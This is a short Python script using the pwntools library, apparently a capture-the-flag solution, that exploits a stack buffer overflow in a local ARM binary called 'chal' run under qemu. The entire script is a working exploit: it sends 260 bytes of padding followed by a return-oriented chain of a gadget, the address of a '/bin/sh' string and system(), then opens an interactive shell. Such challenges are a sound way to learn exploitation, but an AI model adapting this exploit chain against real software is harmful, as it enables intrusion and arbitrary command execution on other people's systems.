from pwn import*

#p = process(['qemu-arm-static','-L' ,'/usr/arm-linux-gnueabi/','-g','4321','./chal'])
p = process(['qemu-arm-static','-L' ,'/usr/arm-linux-gnueabi/' ,'./chal'])

gadget = 0x00010458
system = 0x10334
binsh = 0x10540

payload = b'A'*260
payload += p32(gadget)
payload += p32(binsh)   #r0
payload += p32(0)       #r1
payload += p32(0)       #r2
payload += p32(system)   #r3
payload += p32(0)       #rl

p.sendline(payload)

p.interactive()
